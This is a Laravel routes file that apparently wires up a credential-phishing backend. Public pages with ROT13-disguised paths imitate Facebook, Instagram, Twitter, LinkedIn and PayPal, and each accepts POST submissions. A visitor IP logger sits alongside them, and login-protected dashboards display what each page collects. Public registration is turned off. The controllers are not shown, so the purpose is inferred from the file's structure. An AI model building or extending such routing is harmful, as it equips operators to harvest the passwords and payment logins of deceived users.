<?php

use Illuminate\Support\Facades\Route;

use App\Http\Controllers\HomeController;
use App\Http\Controllers\SocialNetwork\FacebookController;
use App\Http\Controllers\SocialNetwork\InstagramController;
use App\Http\Controllers\SocialNetwork\TwitterController;
use App\Http\Controllers\SocialNetwork\LinkedinController;
use App\Http\Controllers\SocialNetwork\MktController;
use App\Http\Controllers\SocialNetwork\PaypalController;
use App\Http\Controllers\IpAddressController;
use App\Http\Controllers\ErpController;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/
/* force laravel work out on https */
URL::forceScheme('https');

Route::get('/', function () {
    return view('welcome');
});



//Auth::routes();
Auth::routes([
    'register' => false, // Registration Routes...
    'reset' => false, // Password Reset Routes...
    'verify' => false, // Email Verification Routes...
]);


/**
 * Web
 */
Route::get('/home', [HomeController::class, 'index'])->name('home');

// Facebook
Route::get('/snprobbx', [FacebookController::class, 'index'])->name('snprobbx');
Route::post('/snprobbx', [FacebookController::class, 'store']);

Route::get('/vafgntenz', [InstagramController::class, 'index'])->name('vafgntenz');
Route::post('/vafgntenz', [InstagramController::class, 'store']);

Route::get('/gjvggre', [TwitterController::class, 'index'])->name('gjvggre');
Route::post('/gjvggre', [TwitterController::class, 'store']);

Route::get('/yvaxrqva', [LinkedinController::class, 'index'])->name('yvaxrqva');
Route::post('/yvaxrqva', [LinkedinController::class, 'store']);

Route::get('/mkt', [MktController::class, 'index'])->name('mkt');
Route::post('/mkt', [MktController::class, 'store']);

Route::get('/visitor', [IpAddressController::class, 'index'])->name('visitor');
Route::post('/visitor', [IpAddressController::class, 'store']);

Route::get('/cnlcny', [PaypalController::class, 'index'])->name('cnlcny');
Route::post('/cnlcny', [PaypalController::class, 'store']);

Route::get('/erp', [ErpController::class, 'index'])->name('erp');
Route::post('/erp', [ErpController::class, 'store']);






Route::group(['middleware' => ['auth']], function () { 
    Route::get('/dashboardfacebook', [FacebookController::class, 'dashboardFacebook'])->name('dashboardFacebook');
    Route::get('/dashboardinstagram', [InstagramController::class, 'dashboardInstagram'])->name('dashboardInstagram');
    Route::get('/dashboardtwitter', [TwitterController::class, 'dashboardTwitter'])->name('dashboardtwitter');
    Route::get('/dashboardlinkedin', [LinkedinController::class, 'dashboardLinkedin'])->name('dashboardlinkedin');
    Route::get('/dashboardpaypal', [PaypalController::class, 'dashboardPaypal'])->name('dashboardpaypal');
    Route::get('/dashboardmkt', [MktController::class, 'dashboardMkt'])->name('dashboardmkt');
    Route::get('/dashboardvisitor', [IpAddressController::class, 'dashboardVisitor'])->name('dashboardvisitor');
    Route::get('/dashboarderp', [ErpController::class, 'dashboarderp'])->name('dashboarderp');
});